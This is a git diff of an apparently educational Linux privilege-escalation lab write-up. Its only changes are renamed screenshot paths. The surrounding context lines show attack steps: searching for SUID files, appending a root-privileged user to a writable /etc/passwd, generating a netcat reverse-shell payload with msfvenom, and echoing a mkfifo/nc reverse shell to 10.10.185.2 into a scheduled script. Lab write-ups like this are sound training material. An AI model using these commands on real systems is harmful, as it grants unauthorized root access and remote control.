@@ -53,7 +53,7 @@ Some users can write to passwd file
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Running the shell script in user3 home directory gives us root access right away.
 
@@ -63,7 +63,7 @@ Running the shell script in user3 home directory gives us root access right away
 /home/user3/shell
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploiting Writeable /etc/passwd
 
@@ -82,7 +82,7 @@ echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
 cat /etc/passwd
 ```
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>
 
 ```
 su new
@@ -133,7 +133,7 @@ Password: password
 msfvenom -p cmd/unix/reverse_netcat lhost=$KALI lport=8888 R
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -159,7 +159,7 @@ echo 'mkfifo /tmp/cibykaz; nc 10.10.185.2 8888 0</tmp/cibykaz | /bin/sh >/tmp/ci
 
 Wait for the script to run and catch the shell on Kali.
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploiting PATH Variable
 
